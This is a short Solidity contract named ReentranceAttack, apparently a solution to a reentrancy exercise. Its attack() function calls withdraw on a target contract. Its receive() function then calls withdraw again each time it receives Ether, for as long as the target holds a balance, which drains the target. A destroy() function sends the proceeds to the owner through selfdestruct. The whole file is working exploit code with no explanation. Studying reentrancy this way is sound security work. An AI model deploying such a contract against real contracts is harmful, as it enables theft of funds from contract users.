// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'interfaces/reentranceInterface.sol';

contract ReentranceAttack {
    ReentranceInterface reentrance;
    address payable public owner;
    uint public amount;

    constructor(address _address, uint _amount) public {
        owner = msg.sender;
        amount = _amount;
        reentrance = ReentranceInterface(_address);
    }

    function destroy() public {
        selfdestruct(owner);
    }

    function attack() public {
        reentrance.withdraw(amount);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(amount);
        }
    }
}